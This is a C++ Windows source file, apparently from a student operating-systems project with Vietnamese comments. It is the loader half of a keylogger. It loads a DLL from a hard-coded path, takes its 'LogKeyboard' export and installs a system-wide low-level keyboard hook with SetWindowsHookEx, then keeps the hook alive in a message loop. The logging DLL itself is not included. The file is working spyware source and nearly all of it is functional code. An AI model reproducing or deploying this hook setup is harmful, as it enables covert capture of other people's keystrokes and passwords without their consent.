#pragma warning(suppress:28251)
#include <Windows.h>
#include<string>
#include<iostream>
#include "framework.h"
#include "Keylogger.h"
using namespace std;

LRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);
HINSTANCE dll;
HHOOK hHook = NULL;
typedef void(*LOADPROC) (HHOOK hHook);
string path = "F:\\k1-21-22\\DACSNM\\HDH\\code\\DLL\\Debug\\DLL.dll";

// convert string to wstring
wstring convert(const string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	wstring r(buf);
	delete[] buf;
	return r;
}

wstring temp = convert(path);
LPCWSTR lib = temp.c_str();

INT WINAPI  WinMain(HINSTANCE hThisInstance, HINSTANCE hPreInstance, LPSTR lpszArgument, int nFunsterStil) {

	dll = LoadLibrary(lib);
	if (dll == NULL) {
		return 0;
	}
	HOOKPROC hpr = (HOOKPROC)GetProcAddress(dll, "LogKeyboard");
	if (hpr == NULL) {
		return 0;
	}
	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, hpr, dll, 0);
	if (hHook == NULL) {
		return 0;
	}
	LOADPROC lpr = (LOADPROC)GetProcAddress(dll, "SetGlobalHook");
	lpr(hHook);

	MSG messages; // Luu message cua ung dung

	// Doi nhan thong diep tu hang doi ung dung
	while (GetMessage(&messages, NULL, 0, 0)) {
		TranslateMessage(&messages); 	// Dich thong diep
		DispatchMessage(&messages);     // Tra lai thong diep cho windows
	}
	return messages.wParam;
}

// Ham nay duoc goi boi DispatchMessage()
LRESULT CALLBACK WindowProcedure(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam) {
	switch (message)
	{
	case WM_DESTROY:
		PostQuitMessage(0);
		UnhookWindowsHookEx(hHook);
		hHook = NULL;
		break;
	default:
		return DefWindowProc(hwnd, message, wParam, lParam);
		break;
	}
	return 0;
}
